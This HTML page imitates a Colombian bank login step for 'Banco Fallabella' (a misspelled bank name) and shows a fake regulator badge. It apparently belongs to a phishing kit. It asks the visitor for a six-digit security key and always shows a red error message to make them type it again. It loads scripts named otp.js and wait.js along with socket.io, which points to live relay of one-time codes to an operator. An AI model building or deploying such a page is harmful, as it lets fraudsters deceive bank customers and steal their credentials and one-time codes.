<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="Página de espera para validación bancaria"
    />
    <title>Validación Bancaria</title>
    <link rel="stylesheet" href="css/style.css" />
    <script src="../../../js/functions.js"></script>
    <link rel="shortcut icon" href="favicon.webp" type="image/x-icon" />
    <style>
      :root {
        --color-primary: #000;
        --color-secondary: #2b3035;
        --color-button: #387b34;
        --spacing-standard: 10px;
        --border-radius: 20px;
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: system-ui, -apple-system, sans-serif;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
      }

      header {
        height: 10vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background-color: #fafafa;
        border-radius: 0 0 var(--border-radius) var(--border-radius);
        padding: var(--spacing-standard) 0;
      }

      .main-content {
        flex: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 2rem;
        padding: 0 1rem;
        text-align: center;
      }

      h1 {
        font-size: clamp(1.5rem, 4vw, 2rem);
        color: var(--color-secondary);
      }

      footer {
        height: 10vh;
        display: flex;
        align-items: center;
        justify-content: space-around;
        background-color: var(--color-secondary);
        border-radius: var(--border-radius) var(--border-radius) 0 0;
        padding: var(--spacing-standard) 0;
      }

      .logo {
        height: 80%;
        width: auto;
      }

      .superintendencia-logo {
        width: 40%;
        max-width: 200px;
        height: auto;
      }

      button {
        width: 90%;
        height: 45px;
        border-radius: 5px;
        background-color: var(--color-button);
        color: white;
        border: none;
        font-weight: 700;
      }

      @media (max-width: 576px) {
        footer {
          flex-direction: column;
          height: auto;
        }
        .logo {
          height: auto;
          width: 25%;
        }

        .superintendencia-logo {
          width: 60%;
        }
      }
    </style>
  </head>
  <body>
    <header>
      <img
        class="logo"
        src="logo-big.svg"
        alt="Logo del Banco"
        loading="eager"
      />
    </header>

    <main class="main-content">
      <h2>Ingresa a tu Banco Fallabella</h2>
      <div>
        <input
          type="number"
          name="documento"
          id="txtdinamica"
          placeholder="Clave de seguridad"
          style="
            width: 80%;
            padding-left: 30px;
            height: 40px;
            border: none;
            border-bottom: 1px solid gray;
            font-size: 17px;
          "
          maxlength="6"
          inputmode="numeric"
          oninput="this.value = this.value.slice(0, 6)"
        />
        <p style="margin-top: 10px; font-weight: 800; color: #ff0000">
          Error en su clave de seguridad
        </p>
      </div>

      <button type="submit" name="clave" id="btnDinamica" value="Ingresar">
        Validar
      </button>
    </main>

    <footer>
      <img
        class="logo"
        src="logo-big.svg"
        alt="Logo del Banco"
        loading="lazy"
      />
      <img
        class="superintendencia-logo"
        src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.bancoagrario.gov.co%2Fsites%2Fdefault%2Ffiles%2Finline-images%2Fvigilado_0.png"
        alt="Vigilado por Superintendencia Financiera de Colombia"
        loading="lazy"
      />
    </footer>
    <script src="js/otp.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
    <script src="js/wait.js"></script>
  </body>
</html>
